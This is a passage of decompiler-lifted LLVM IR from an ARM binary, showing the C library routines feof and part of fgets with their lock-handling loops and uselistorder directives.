  uselistorder i32* %r6.global-to-local, { 15, 11, 9, 13, 12, 2, 3, 10, 4, 14, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 1520, { 1, 2, 0 }
  uselistorder i32 -38812, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_ca18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca14, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_c9e0, { 1, 0 }
  uselistorder label %dec_label_pc_c9ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c9a4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c960, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_c918, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c72c, { 1, 0 }
  uselistorder label %dec_label_pc_c6e0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_c65c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c658, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_c5f8, { 1, 0 }
  uselistorder label %dec_label_pc_c5f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c5f8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c598, { 1, 0 }
  uselistorder label %dec_label_pc_c56c, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_ca54 = load i32, i32* @r4, align 4
  store i32 %v3_ca54, i32* %stack_var_-24, align 4
  %v2_ca58 = add i32 %tmp, 52
  %v3_ca58 = inttoptr i32 %v2_ca58 to i32*
  %v4_ca58 = load i32, i32* %v3_ca58, align 4
  store i32 %v4_ca58, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ca5c = icmp eq i32 %v4_ca58, 0
  store i32 %tmp, i32* %r7.global-to-local, align 4
  br i1 %v2_ca5c, label %dec_label_pc_ca68, label %dec_label_pc_cacc

dec_label_pc_ca68:                                ; preds = %entry
  %v0_ca68 = call i32 @__aeabi_read_tp()
  %v0_ca6c = load i32, i32* %r7.global-to-local, align 4
  %v1_ca6c = add i32 %v0_ca6c, 64
  %v2_ca6c = inttoptr i32 %v1_ca6c to i32*
  %v3_ca6c = load i32, i32* %v2_ca6c, align 4
  store i32 %v3_ca6c, i32* %r3.global-to-local, align 4
  %v1_ca70 = add i32 %v0_ca68, -1168
  store i32 %v1_ca70, i32* %r8.global-to-local, align 4
  %v3_ca74 = icmp uge i32 %v3_ca6c, %v1_ca70
  store i1 %v3_ca74, i1* %cpsr_c.global-to-local, align 1
  %v9_ca74 = icmp eq i32 %v3_ca6c, %v1_ca70
  br i1 %v9_ca74, label %dec_label_pc_cac0, label %dec_label_pc_ca7c

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca68
  %v1_ca7c = add i32 %v0_ca6c, 56
  store i32 %v1_ca7c, i32* %r5.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_ca7c, i32* %r2.global-to-local, align 4
  %v0_ca88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ca88, i32* %r4.global-to-local, align 4
  %v1_ca8c35 = inttoptr i32 %v1_ca7c to i32*
  %v2_ca8c36 = load i32, i32* %v1_ca8c35, align 4
  store i32 %v2_ca8c36, i32* %r3.global-to-local, align 4
  %v3_ca9038 = icmp uge i32 %v2_ca8c36, %v0_ca88
  store i1 %v3_ca9038, i1* %cpsr_c.global-to-local, align 1
  %v9_ca9044 = icmp eq i32 %v2_ca8c36, %v0_ca88
  br i1 %v9_ca9044, label %dec_label_pc_ca98, label %dec_label_pc_cab0

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca7c, %dec_label_pc_ca98.dec_label_pc_ca8c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_caa8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_caa8, label %dec_label_pc_caac, label %dec_label_pc_ca98.dec_label_pc_ca8c_crit_edge

dec_label_pc_ca98.dec_label_pc_ca8c_crit_edge:    ; preds = %dec_label_pc_ca98
  %v0_ca8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ca90.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ca8c = inttoptr i32 %v0_ca8c.pre to i32*
  %v2_ca8c = load i32, i32* %v1_ca8c, align 4
  store i32 %v2_ca8c, i32* %r3.global-to-local, align 4
  %v3_ca90 = icmp uge i32 %v2_ca8c, %v1_ca90.pre
  store i1 %v3_ca90, i1* %cpsr_c.global-to-local, align 1
  %v9_ca90 = icmp eq i32 %v2_ca8c, %v1_ca90.pre
  br i1 %v9_ca90, label %dec_label_pc_ca98, label %dec_label_pc_cab0

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca98
  %v0_caac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_caac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca7c, %dec_label_pc_ca98.dec_label_pc_ca8c_crit_edge, %dec_label_pc_caac
  %v0_cab0 = phi i32 [ %v0_caac, %dec_label_pc_caac ], [ %v2_ca8c36, %dec_label_pc_ca7c ], [ %v2_ca8c, %dec_label_pc_ca98.dec_label_pc_ca8c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cab0 = icmp eq i32 %v0_cab0, 0
  br i1 %v2_cab0, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_cab0
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_cab0, %bb
  %v1_cab8 = xor i1 %v2_cab0, true
  call void @__pseudo_cond_branch(i1 %v1_cab8, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_cabc = load i32, i32* %r8.global-to-local, align 4
  %v1_cabc = load i32, i32* %r7.global-to-local, align 4
  %v2_cabc = add i32 %v1_cabc, 64
  %v3_cabc = inttoptr i32 %v2_cabc to i32*
  store i32 %v0_cabc, i32* %v3_cabc, align 4
  %v0_cac0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca68, %bb19
  %v0_cac0 = phi i32 [ %v0_ca6c, %dec_label_pc_ca68 ], [ %v0_cac0.pre, %bb19 ]
  %v1_cac0 = add i32 %v0_cac0, 60
  %v2_cac0 = inttoptr i32 %v1_cac0 to i32*
  %v3_cac0 = load i32, i32* %v2_cac0, align 4
  %v1_cac4 = add i32 %v3_cac0, 1
  store i32 %v1_cac4, i32* %r3.global-to-local, align 4
  store i32 %v1_cac4, i32* %v2_cac0, align 4
  %v0_cacc.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_cad0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cacc

dec_label_pc_cacc:                                ; preds = %entry, %dec_label_pc_cac0
  %v1_cae4 = phi i32 [ %tmp, %entry ], [ %v0_cad0.pre, %dec_label_pc_cac0 ]
  %v0_cacc = phi i32 [ %v4_ca58, %entry ], [ %v0_cacc.pre, %dec_label_pc_cac0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cacc = icmp eq i32 %v0_cacc, 0
  %v1_cad0 = inttoptr i32 %v1_cae4 to i16*
  %v2_cad0 = load i16, i16* %v1_cad0, align 2
  %v3_cad0 = zext i16 %v2_cad0 to i32
  store i32 %v3_cad0, i32* %r6.global-to-local, align 4
  br i1 %v2_cacc, label %dec_label_pc_cad8, label %dec_label_pc_cb4c

dec_label_pc_cad8:                                ; preds = %dec_label_pc_cacc
  %v1_cad8 = add i32 %v1_cae4, 60
  %v2_cad8 = inttoptr i32 %v1_cad8 to i32*
  %v3_cad8 = load i32, i32* %v2_cad8, align 4
  %v1_cadc = add i32 %v3_cad8, -1
  store i32 %v1_cadc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cae0 = icmp eq i32 %v1_cadc, 0
  store i32 %v1_cadc, i32* %v2_cad8, align 4
  br i1 %v2_cae0, label %dec_label_pc_caec, label %dec_label_pc_cb4c

dec_label_pc_caec:                                ; preds = %dec_label_pc_cad8
  %v0_caec = load i32, i32* %r3.global-to-local, align 4
  %v1_caec = load i32, i32* %r7.global-to-local, align 4
  %v2_caec = add i32 %v1_caec, 64
  %v3_caec = inttoptr i32 %v2_caec to i32*
  store i32 %v0_caec, i32* %v3_caec, align 4
  %v0_caf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_caf0 = add i32 %v0_caf0, 56
  store i32 %v1_caf0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cb24.dec_label_pc_caf4_crit_edge, %dec_label_pc_caec
  %v0_cafc = phi i32 [ %v0_cafc.pre, %dec_label_pc_cb24.dec_label_pc_caf4_crit_edge ], [ %v1_caf0, %dec_label_pc_caec ]
  %v0_caf4 = phi i32 [ %v0_caf4.pre, %dec_label_pc_cb24.dec_label_pc_caf4_crit_edge ], [ %v0_caf0, %dec_label_pc_caec ]
  %v1_caf4 = add i32 %v0_caf4, 56
  %v2_caf4 = inttoptr i32 %v1_caf4 to i32*
  %v3_caf4 = load i32, i32* %v2_caf4, align 4
  store i32 %v3_caf4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_cafc, i32* %r2.global-to-local, align 4
  %v1_cb0023 = inttoptr i32 %v0_cafc to i32*
  %v2_cb0024 = load i32, i32* %v1_cb0023, align 4
  store i32 %v2_cb0024, i32* %r3.global-to-local, align 4
  %v3_cb0426 = icmp uge i32 %v2_cb0024, %v3_caf4
  store i1 %v3_cb0426, i1* %cpsr_c.global-to-local, align 1
  %v9_cb0432 = icmp eq i32 %v2_cb0024, %v3_caf4
  br i1 %v9_cb0432, label %dec_label_pc_cb0c, label %dec_label_pc_cb24

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_caf4, %dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cb1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cb1c, label %dec_label_pc_cb20, label %dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge

dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge:    ; preds = %dec_label_pc_cb0c
  %v0_cb00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cb04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cb00 = inttoptr i32 %v0_cb00.pre to i32*
  %v2_cb00 = load i32, i32* %v1_cb00, align 4
  store i32 %v2_cb00, i32* %r3.global-to-local, align 4
  %v3_cb04 = icmp uge i32 %v2_cb00, %v1_cb04.pre
  store i1 %v3_cb04, i1* %cpsr_c.global-to-local, align 1
  %v9_cb04 = icmp eq i32 %v2_cb00, %v1_cb04.pre
  br i1 %v9_cb04, label %dec_label_pc_cb0c, label %dec_label_pc_cb24

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cb0c
  %v0_cb20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cb20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cb24

dec_label_pc_cb24:                                ; preds = %dec_label_pc_caf4, %dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge, %dec_label_pc_cb20
  %v0_cb2c = phi i32 [ %v0_cb20, %dec_label_pc_cb20 ], [ %v2_cb0024, %dec_label_pc_caf4 ], [ %v2_cb00, %dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge ]
  %v1_cb24 = phi i32 [ %v0_cb20, %dec_label_pc_cb20 ], [ %v3_caf4, %dec_label_pc_caf4 ], [ %v1_cb04.pre, %dec_label_pc_cb0c.dec_label_pc_cb00_crit_edge ]
  %v3_cb24 = icmp uge i32 %v0_cb2c, %v1_cb24
  store i1 %v3_cb24, i1* %cpsr_c.global-to-local, align 1
  %v9_cb24 = icmp eq i32 %v0_cb2c, %v1_cb24
  br i1 %v9_cb24, label %dec_label_pc_cb2c, label %dec_label_pc_cb24.dec_label_pc_caf4_crit_edge

dec_label_pc_cb24.dec_label_pc_caf4_crit_edge:    ; preds = %dec_label_pc_cb24
  %v0_caf4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_cafc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_caf4

dec_label_pc_cb2c:                                ; preds = %dec_label_pc_cb24
  %v2_cb2c = icmp ne i32 %v1_cb24, 0
  store i1 %v2_cb2c, i1* %cpsr_c.global-to-local, align 1
  %v7_cb30 = icmp slt i32 %v1_cb24, 2
  br i1 %v7_cb30, label %dec_label_pc_cb4c, label %dec_label_pc_cb34

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cb2c
  %v0_cb38 = load i32, i32* @r1, align 4
  %v1_cb38 = add i32 %v0_cb38, 129
  store i32 %v1_cb38, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cad8, %dec_label_pc_cacc, %dec_label_pc_cb34, %dec_label_pc_cb2c
  %v0_cb4c = load i32, i32* %r6.global-to-local, align 4
  %v1_cb4c = and i32 %v0_cb4c, 4
  %v2_cb50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_cb50, i32* @r4, align 4
  ret i32 %v1_cb4c

; uselistorder directives
  uselistorder i32 %v0_cb20, { 1, 0, 2 }
  uselistorder i32 %v1_cb04.pre, { 0, 2, 1 }
  uselistorder i32 %v1_ca90.pre, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 7, 2, 3, 6, 1, 4, 5, 8 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 12, 4, 5, 6, 7, 9, 8, 11, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder label %dec_label_pc_cb4c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_cb24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb0c, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cab0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ca98, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_cb58 = load i32, i32* @r4, align 4
  store i32 %v3_cb58, i32* %stack_var_-32, align 4
  %v6_cb58 = load i32, i32* @r5, align 4
  %v9_cb58 = load i32, i32* @r6, align 4
  %v12_cb58 = load i32, i32* @r7, align 4
  %v15_cb58 = load i32, i32* @r8, align 4
  %v24_cb58 = load i32, i32* @lr, align 4
  %v1_cb5c = add i32 %arg3, 52
  %v2_cb5c = inttoptr i32 %v1_cb5c to i32*
  %v3_cb5c = load i32, i32* %v2_cb5c, align 4
  store i32 %v3_cb5c, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cb60 = icmp eq i32 %v3_cb5c, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_cb60, label %dec_label_pc_cb74, label %dec_label_pc_cbd8

dec_label_pc_cb74:                                ; preds = %entry
  %v0_cb74 = call i32 @__aeabi_read_tp()
  %v1_cb78 = add i32 %arg3, 64
  %v2_cb78 = inttoptr i32 %v1_cb78 to i32*
  %v3_cb78 = load i32, i32* %v2_cb78, align 4
  store i32 %v3_cb78, i32* %r3.global-to-local, align 4
  %v1_cb7c = add i32 %v0_cb74, -1168
  store i32 %v1_cb7c, i32* @r8, align 4
  %v3_cb80 = icmp uge i32 %v3_cb78, %v1_cb7c
  store i1 %v3_cb80, i1* %cpsr_c.global-to-local, align 1
  %v9_cb80 = icmp eq i32 %v3_cb78, %v1_cb7c
  br i1 %v9_cb80, label %dec_label_pc_cbcc, label %dec_label_pc_cb88

dec_label_pc_cb88:                                ; preds = %dec_label_pc_cb74
  %v1_cb88 = add i32 %arg3, 56
  store i32 %v1_cb88, i32* @r5, align 4
  store i32 %v1_cb88, i32* %r2.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r6, align 4
  store i32 %v0_cb94, i32* @r4, align 4
  %v1_cb9836 = inttoptr i32 %v1_cb88 to i32*
  %v2_cb9837 = load i32, i32* %v1_cb9836, align 4
  store i32 %v2_cb9837, i32* %r3.global-to-local, align 4
  %v3_cb9c39 = icmp uge i32 %v2_cb9837, %v0_cb94
  store i1 %v3_cb9c39, i1* %cpsr_c.global-to-local, align 1
  %v9_cb9c45 = icmp eq i32 %v2_cb9837, %v0_cb94
  br i1 %v9_cb9c45, label %dec_label_pc_cba4, label %dec_label_pc_cbbc

dec_label_pc_cba4:                                ; preds = %dec_label_pc_cb88, %dec_label_pc_cba4.dec_label_pc_cb98_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cbb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cba4.dec_label_pc_cb98_crit_edge

dec_label_pc_cba4.dec_label_pc_cb98_crit_edge:    ; preds = %dec_label_pc_cba4
  %v0_cb98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cb9c.pre = load i32, i32* @r4, align 4
  %v1_cb98 = inttoptr i32 %v0_cb98.pre to i32*
  %v2_cb98 = load i32, i32* %v1_cb98, align 4
  store i32 %v2_cb98, i32* %r3.global-to-local, align 4
  %v3_cb9c = icmp uge i32 %v2_cb98, %v1_cb9c.pre
  store i1 %v3_cb9c, i1* %cpsr_c.global-to-local, align 1
  %v9_cb9c = icmp eq i32 %v2_cb98, %v1_cb9c.pre
  br i1 %v9_cb9c, label %dec_label_pc_cba4, label %dec_label_pc_cbbc

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cba4
  %v0_cbb8 = load i32, i32* @r4, align 4
  store i32 %v0_cbb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cbbc

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cb88, %dec_label_pc_cba4.dec_label_pc_cb98_crit_edge, %dec_label_pc_cbb8
  %v0_cbbc = phi i32 [ %v0_cbb8, %dec_label_pc_cbb8 ], [ %v2_cb9837, %dec_label_pc_cb88 ], [ %v2_cb98, %dec_label_pc_cba4.dec_label_pc_cb98_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cbbc = icmp eq i32 %v0_cbbc, 0
  br i1 %v2_cbbc, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_cbbc
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_cbbc, %bb
  store i32 52168, i32* @lr, align 4
  %v1_cbc4 = xor i1 %v2_cbbc, true
  call void @__pseudo_cond_branch(i1 %v1_cbc4, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_cbc8 = load i32, i32* @r8, align 4
  %v1_cbc8 = load i32, i32* @r7, align 4
  %v2_cbc8 = add i32 %v1_cbc8, 64
  %v3_cbc8 = inttoptr i32 %v2_cbc8 to i32*
  store i32 %v0_cbc8, i32* %v3_cbc8, align 4
  br label %dec_label_pc_cbcc

dec_label_pc_cbcc:                                ; preds = %dec_label_pc_cb74, %bb20
  %v0_cbcc = load i32, i32* @r7, align 4
  %v1_cbcc = add i32 %v0_cbcc, 60
  %v2_cbcc = inttoptr i32 %v1_cbcc to i32*
  %v3_cbcc = load i32, i32* %v2_cbcc, align 4
  %v1_cbd0 = add i32 %v3_cbcc, 1
  store i32 %v1_cbd0, i32* %r3.global-to-local, align 4
  store i32 %v1_cbd0, i32* %v2_cbcc, align 4
  %v0_cbd8.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_cbdc.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_cbe0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %entry, %dec_label_pc_cbcc
  %v0_cbe0 = phi i32 [ %arg3, %entry ], [ %v0_cbe0.pre, %dec_label_pc_cbcc ]
  %v0_cbdc = phi i32 [ %arg2, %entry ], [ %v0_cbdc.pre, %dec_label_pc_cbcc ]
  %v0_cbd8 = phi i32 [ %arg1, %entry ], [ %v0_cbd8.pre, %dec_label_pc_cbcc ]
  store i32 %v0_cbe0, i32* %r2.global-to-local, align 4
  %v3_cbe4 = inttoptr i32 %v0_cbd8 to i8*
  %v4_cbe4 = call i32 @__GI_fgets_unlocked(i8* %v3_cbe4, i32 %v0_cbdc, i32 %v0_cbe0)
  %v0_cbe8 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cbe8 = icmp eq i32 %v0_cbe8, 0
  store i32 %v4_cbe4, i32* %r8.global-to-local, align 4
  br i1 %v2_cbe8, label %dec_label_pc_cbf4, label %dec_label_pc_cc68

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf4 = load i32, i32* @r7, align 4
  %v1_cbf4 = add i32 %v0_cbf4, 60
  %v2_cbf4 = inttoptr i32 %v1_cbf4 to i32*
  %v3_cbf4 = load i32, i32* %v2_cbf4, align 4
  %v1_cbf8 = add i32 %v3_cbf4, -1
  store i32 %v1_cbf8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cbfc = icmp eq i32 %v1_cbf8, 0
  store i32 %v1_cbf8, i32* %v2_cbf4, align 4
  br i1 %v2_cbfc, label %dec_label_pc_cc08, label %dec_label_pc_cc68

dec_label_pc_cc08:                                ; preds = %dec_label_pc_cbf4
  %v0_cc08 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc08 = load i32, i32* @r7, align 4
  %v2_cc08 = add i32 %v1_cc08, 64
  %v3_cc08 = inttoptr i32 %v2_cc08 to i32*
  store i32 %v0_cc08, i32* %v3_cc08, align 4
  %v0_cc0c = load i32, i32* @r7, align 4
  %v1_cc0c = add i32 %v0_cc0c, 56
  store i32 %v1_cc0c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc40.dec_label_pc_cc10_crit_edge, %dec_label_pc_cc08
  %v0_cc18 = phi i32 [ %v0_cc18.pre, %dec_label_pc_cc40.dec_label_pc_cc10_crit_edge ], [ %v1_cc0c, %dec_label_pc_cc08 ]
  %v0_cc10 = phi i32 [ %v0_cc10.pre, %dec_label_pc_cc40.dec_label_pc_cc10_crit_edge ], [ %v0_cc0c, %dec_label_pc_cc08 ]
  %v1_cc10 = add i32 %v0_cc10, 56
  %v2_cc10 = inttoptr i32 %v1_cc10 to i32*
  %v3_cc10 = load i32, i32* %v2_cc10, align 4
  store i32 %v3_cc10, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_cc18, i32* %r2.global-to-local, align 4
  %v1_cc1c24 = inttoptr i32 %v0_cc18 to i32*
  %v2_cc1c25 = load i32, i32* %v1_cc1c24, align 4
  store i32 %v2_cc1c25, i32* %r3.global-to-local, align 4
  %v3_cc2027 = icmp uge i32 %v2_cc1c25, %v3_cc10
  store i1 %v3_cc2027, i1* %cpsr_c.global-to-local, align 1
  %v9_cc2033 = icmp eq i32 %v2_cc1c25, %v3_cc10
  br i1 %v9_cc2033, label %dec_label_pc_cc28, label %dec_label_pc_cc40

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cc10, %dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cc38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cc38, label %dec_label_pc_cc3c, label %dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge

dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge:    ; preds = %dec_label_pc_cc28
  %v0_cc1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cc20.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cc1c = inttoptr i32 %v0_cc1c.pre to i32*
  %v2_cc1c = load i32, i32* %v1_cc1c, align 4
  store i32 %v2_cc1c, i32* %r3.global-to-local, align 4
  %v3_cc20 = icmp uge i32 %v2_cc1c, %v1_cc20.pre
  store i1 %v3_cc20, i1* %cpsr_c.global-to-local, align 1
  %v9_cc20 = icmp eq i32 %v2_cc1c, %v1_cc20.pre
  br i1 %v9_cc20, label %dec_label_pc_cc28, label %dec_label_pc_cc40

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc28
  %v0_cc3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cc3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc40

dec_label_pc_cc40:                                ; preds = %dec_label_pc_cc10, %dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge, %dec_label_pc_cc3c
  %v0_cc48 = phi i32 [ %v0_cc3c, %dec_label_pc_cc3c ], [ %v2_cc1c25, %dec_label_pc_cc10 ], [ %v2_cc1c, %dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge ]
  %v1_cc40 = phi i32 [ %v0_cc3c, %dec_label_pc_cc3c ], [ %v3_cc10, %dec_label_pc_cc10 ], [ %v1_cc20.pre, %dec_label_pc_cc28.dec_label_pc_cc1c_crit_edge ]
  %v3_cc40 = icmp uge i32 %v0_cc48, %v1_cc40
  store i1 %v3_cc40, i1* %cpsr_c.global-to-local, align 1
  %v9_cc40 = icmp eq i32 %v0_cc48, %v1_cc40
  br i1 %v9_cc40, label %dec_label_pc_cc48, label %dec_label_pc_cc40.dec_label_pc_cc10_crit_edge

dec_label_pc_cc40.dec_label_pc_cc10_crit_edge:    ; preds = %dec_label_pc_cc40
  %v0_cc10.pre = load i32, i32* @r7, align 4
  %v0_cc18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc48:                                ; preds = %dec_label_pc_cc40
  %v2_cc48 = icmp ne i32 %v1_cc40, 0
  store i1 %v2_cc48, i1* %cpsr_c.global-to-local, align 1
  %v7_cc4c = icmp slt i32 %v1_cc40, 2
  br i1 %v7_cc4c, label %dec_label_pc_cc68, label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc48
  %v0_cc54 = load i32, i32* @r1, align 4
  %v1_cc54 = add i32 %v0_cc54, 129
  store i32 %v1_cc54, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc68

